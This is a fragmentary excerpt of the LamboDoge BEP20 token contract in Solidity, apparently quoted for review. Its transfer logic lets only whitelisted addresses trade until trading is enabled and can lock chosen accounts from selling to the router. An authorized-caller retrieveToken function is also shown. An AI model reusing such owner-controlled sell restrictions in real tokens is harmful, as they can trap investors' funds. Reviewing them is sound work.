...
contract LamboDoge is Context, IBEP20, Ownable, ReentrancyGuard {
    ...
    uint256 private _liquidityFee = 4; // 2% will be added pool, 2% will be converted to BNB for marketing
    uint256 private _previousLiquidityFee = _liquidityFee;

    uint256 private minTokenNumberToSell = _tTotal.div(100000); // 0.001% max tx amount will trigger swap and add liquidity
    ...
    constructor (
		...
		_applyFeeFor[routerAddress] = true;
        // exclude from max tx
    ...
    function _transfer(
        ...
        if (!tradingEnabled && !_isTradingWhiteListed[from]) {
            require(tradingEnabled, "Trading is not enabled yet");
        }
        
		if (_applyFeeFor[to] && _lockAccount[from] != 0) {
			require(_lockAccount[from] <= block.timestamp, "Error: transfer for this account is locked until lock time");
		}
     ...
     */
    function retrieveToken(address tokenAddress,uint256 amount) external nonReentrant onlyAuthorizedCallers {
